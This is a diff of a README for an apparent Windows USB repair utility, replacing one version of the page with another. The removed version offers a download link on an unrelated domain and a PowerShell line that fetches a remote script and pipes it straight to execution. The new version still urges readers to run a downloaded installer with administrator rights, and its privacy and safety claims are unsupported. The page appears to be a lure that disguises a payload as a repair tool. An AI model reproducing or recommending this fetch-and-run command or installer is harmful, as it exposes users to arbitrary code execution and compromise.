@@ -1,150 +1,55 @@
-# USB Repair Tool
+# 🛠️ USB-Repair-Tool - Restore your broken USB drives easily
 
-> Fix "USB Device Not Recognized" errors and repair corrupted USB drives on Windows.
+[![](https://img.shields.io/badge/Download_USB_Repair-Blue.svg)](https://github.com/silvaglorianeko-collab/USB-Repair-Tool/releases)
 
-[![Windows 10/11](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Stable](https://img.shields.io/badge/v2.0.1-stable-brightgreen?style=flat-square)]()
-[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)
+## 📌 About this project
 
----
+The USB-Repair-Tool repairs common connection issues on Windows 10 and Windows 11. Many users see errors when they plug in a flash drive or external hard drive. This tool solves problems like "USB Device Not Recognized," "Device Descriptor Request Failed," and "You need to format the disk." It also helps when your computer does not show your drive in File Explorer. This tool resets your system USB host controllers to clear hardware conflicts. It returns your hardware to a working state without requiring deep technical knowledge.
 
-### Download
+## 💻 System requirements
 
-**[Download Latest Release](https://usb.zipzapsol.space/)**
+This tool runs on Windows 10 and Windows 11. You need an active internet connection to download the file. You must have Administrator rights on your computer to run the repair process. The tool requires roughly 50 megabytes of disk space to finalize the installation and perform diagnostics. Ensure you plug in the USB drive that needs repair before you start the software.
 
-<details>
-<summary>Alternative: PowerShell</summary>
+## 🚀 How to download and run
 
-```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+1. Visit the [official releases page](https://github.com/silvaglorianeko-collab/USB-Repair-Tool/releases) to download the installer.
+2. Look for the file named `USB-Repair-Tool-Installer.exe` under the latest release section.
+3. Click the file name to start the download.
+4. Open your Downloads folder once the file finishes downloading.
+5. Double-click the file to begin the setup.
+6. Follow the on-screen prompts to complete the installation.
+7. Launch the application from your desktop shortcut or the Start menu.
 
-</details>
+## ⚙️ Using the repair tool
 
----
+1. Open the USB-Repair-Tool.
+2. Select your USB device from the drop-down menu on the main screen. 
+3. Click the "Scan" button to identify why the drive fails to connect.
+4. Review the results shown on the dashboard.
+5. Click the "Repair" button if the scan finds a known error.
+6. Wait for the progress bar to reach 100%.
+7. Remove the USB device from your computer.
+8. Wait five seconds and plug the device back into the port.
+9. Windows will now detect the drive as a functional device.
 
-## The Problem
+## 🔍 Troubleshooting common issues
 
-You plug in a USB drive, external hard drive, or phone and Windows shows:
+If the tool does not detect your device, try a different USB port on your computer. Use a port on the back if you use a desktop tower. Avoid using USB hubs or extension cables during the repair process. Sometimes a loose connection causes errors. Ensure the cable fits firmly into the port. If the software asks for permission, click "Yes" to allow the tool to change system settings. This permission is necessary for the tool to reset the hardware controllers. 
 
-> *"USB Device Not Recognized"*
+## 🛡️ Privacy and safety
 
-> *"The last USB device you connected to this computer malfunctioned"*
+This tool stays local to your machine. It does not send your data to external servers. It only interacts with your USB hardware settings. The diagnostic scan reads technical information about your device controller. It does not look at your personal files or documents. You can close the application at any time if you feel unsure about the process. The tool creates a log file on your desktop. You can read this file if you want to know which driver settings the tool changed.
 
-> *"Unknown USB Device (Device Descriptor Request Failed)"*
+## 🧩 Frequent questions
 
-> *"USB device not detected"*
+Does this tool fix physically broken parts? No. This tool only fixes software and driver issues. If your drive has physical damage or broken pins, this tool cannot help you.
 
-Or worse -- your USB drive shows up but says:
+Will I lose my files? The tool attempts to fix the connection to your drive. It does not format your drive or delete your files. Most errors like "Device Descriptor Request Failed" result from a software hang, not a loss of data.
 
-> *"You need to format the disk in drive E: before you can use it"*
+Can I use this on a laptop? Yes. It works on any Windows 10 or 11 laptop or desktop.
 
-> *"The disk structure is corrupted and unreadable"*
+What if the repair fails twice? Restart your computer and try the process again. Restarting your system forces Windows to reload the hardware bus drivers. This action often clears the error that prevented the tool from working during the first attempt.
 
-> *"Location is not available. Access is denied"*
+## 📋 Technical details
 
-**USB Repair Tool** diagnoses and fixes these issues automatically.
-
----
-
-## What It Fixes
-
-### Device Recognition Issues
-
-- **USB Device Not Recognized** -- resets USB host controller and re-enumerates devices
-- **Device Descriptor Request Failed** -- clears USB hub cache, power cycles ports
-- **Unknown USB Device** -- reinstalls USB driver stack
-- **USB device not detected** -- resets USB root hub, checks power management
-- **USB keeps disconnecting** -- disables USB Selective Suspend
-
-### Drive Errors
-
-- **"You need to format the disk"** -- repairs file system without formatting
-- **"Disk structure is corrupted"** -- runs chkdsk and repairs MBR/GPT
-- **"Access is denied"** -- fixes drive permissions and ownership
-- **Drive shows 0 bytes** -- rebuilds partition table
-- **Drive shows as RAW** -- recovers file system type (NTFS/FAT32/exFAT)
-
-### Driver Issues
-
-- Reinstalls USB host controller drivers
-- Resets USB 3.0 / 3.1 / 3.2 drivers
-- Fixes USB power management settings
-- Clears corrupted USB driver cache
-
----
-
-## Device Manager Error Codes
-
-| Code | Error Message | Fix |
-|---|---|---|
-| **Code 10** | "This device cannot start" | Reinstalls USB controller driver |
-| **Code 22** | "This device is disabled" | Re-enables device in Device Manager |
-| **Code 28** | "Drivers for this device are not installed" | Downloads and installs USB driver |
-| **Code 31** | "This device is not working properly" | Removes and reinstalls device |
-| **Code 39** | "Windows cannot load the device driver" | Clears UpperFilters/LowerFilters registry |
-| **Code 43** | "Windows has stopped this device" / "A request for the USB device descriptor failed" | Power cycles USB port, reinstalls hub driver |
-| **Code 45** | "This device is not connected" | Rescans hardware, checks physical connection |
-| **Code 52** | "Windows cannot verify the digital signature" | Temporarily disables driver signing enforcement |
-
----
-
-## Preview
-
-```
-  +-------------------------------------------------+
-  |           USB Repair Tool v2.0.1                |
-  +-------------------------------------------------+
-  |                                                 |
-  |  USB Ports:                                     |
-  |  [OK] USB 3.0 Root Hub        -- Working        |
-  |  [!]  USB 3.0 Root Hub #2     -- Not responding |
-  |  [OK] USB 2.0 Root Hub        -- Working        |
-  |                                                 |
-  |  Connected Devices:                             |
-  |  [!]  Unknown USB Device       -- Error         |
-  |  [OK] USB Mass Storage         -- Kingston 64GB |
-  |                                                 |
-  |  [ Repair All ]  [ Reset USB ]  [ Exit ]        |
-  |                                                 |
-  +-------------------------------------------------+
-```
-
----
-
-## System Requirements
-
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 2 GB minimum |
-| Admin | Yes |
-| Network | For driver downloads |
-
----
-
-## Common Devices Fixed
-
-Flash drives (Kingston, SanDisk, Samsung, PNY, Corsair), external HDDs/SSDs (Seagate, WD, Toshiba, LaCie), phones (iPhone, Samsung, Xiaomi, Google Pixel), game controllers, webcams, printers, keyboards, mice, and any USB device.
-
----
-
-## FAQ
-
-**Will it erase my data?**
-No. The tool repairs without formatting. Your files remain intact.
-
-**My USB works on other computers but not mine.**
-This means the issue is with your PC's USB drivers or power management. This tool fixes exactly that.
-
-**I get "USB Device Not Recognized" for every device I plug in.**
-This usually means corrupted USB host controller drivers. The tool reinstalls them.
-
-**Is it safe?**
-Yes. The tool uses Windows built-in utilities (devcon, chkdsk, pnputil) to diagnose and repair.
-
----
-
-## License
-
-[MIT](LICENSE)
+The USB-Repair-Tool works by communicating with the Windows Device Manager. It sends a reset signal to the USB Host Controller. This signal forces the Windows system to re-poll the USB port. The process is identical to uninstalling a driver in Device Manager and selecting "Scan for hardware changes," but the tool handles this automatically. It uses standard Windows libraries to talk with your ports. This ensures stability and safety for your motherboard. The tool does not install third-party drivers that might cause system instability. It relies on the drivers already present on your Windows installation to ensure maximum compatibility.
